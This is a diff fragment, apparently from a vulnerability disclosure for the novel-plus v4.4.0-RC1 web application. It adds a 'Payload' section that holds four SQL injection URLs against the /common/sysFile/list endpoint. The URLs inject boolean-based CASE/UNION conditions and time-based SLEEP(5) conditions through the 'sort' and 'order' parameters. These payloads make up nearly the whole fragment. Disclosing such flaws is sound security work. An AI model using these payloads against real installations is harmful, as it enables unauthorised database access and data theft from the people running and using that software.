@@ -11,6 +11,12 @@ releases：https://github.com/201206030/novel-plus/releases/tag/v4.4.0-RC1
 
 Payload:
 ```
-
+--sort--
+http://127.0.0.1:8088/common/sysFile/list?limit=10&offset=0&sort=1 AND 7858=(SELECT (CASE WHEN (7858=7858) THEN 7858 ELSE (SELECT 8757 UNION SELECT 2737) END))-- -&order=asc
+http://127.0.0.1:8088/common/sysFile/list?limit=10&offset=0&sort=1 AND (SELECT 8148 FROM (SELECT(SLEEP(5)))yohp)&order=asc
+--order--
+http://127.0.0.1:8088/common/sysFile/list?limit=10&offset=0&sort=1&order=,1 AND 4354=(SELECT (CASE WHEN (4354=4354) THEN 4354 ELSE (SELECT 8745 UNION SELECT 7606) END))-- - asc
+http://127.0.0.1:8088/common/sysFile/list?limit=10&offset=0&sort=1&order=,1 AND (SELECT 2800 FROM (SELECT(SLEEP(5)))qQhq) asc
 ```
+
 
